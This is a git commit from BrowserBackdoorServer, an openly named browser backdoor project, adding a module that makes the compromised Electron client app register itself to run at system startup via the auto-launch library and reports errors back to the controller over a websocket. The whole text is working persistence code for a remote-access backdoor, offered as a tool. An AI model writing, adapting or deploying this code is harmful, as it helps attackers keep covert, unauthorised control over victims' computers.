e0942437fecc2d56a3f91fb22caaf087cb3e2cab
IMcPwn <imcpwn@protonmail.com>
2016-06-07 09:28:29 -0400

    Add enableStartup module

---
+++ server/modules/enableStartup.js
@@ -0,0 +1,27 @@
+/*
+ * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
+ * BrowserBackdoorServer by IMcPwn.
+ * See the file 'LICENSE' for copying permission
+ *
+ * Info: Enables startup of client application
+ * Parameters: None
+ * Returns: undefined, error
+ * Author: IMcPwn
+ */
+
+if (typeof electron == 'undefined') electron = require('electron');
+
+if (typeof AutoLaunch == 'undefined') AutoLaunch = require('auto-launch');
+
+appLauncher = new AutoLaunch({
+    // Change this to the name of the application or what
+    // should appear in the startup menu.
+    name: 'BB'
+});
+
+appLauncher.isEnabled().then(function(enabled){
+    if(enabled) return;
+    return appLauncher.enable();
+}).then(function(err){
+    if (err !== undefined) ws.send(err)
+});
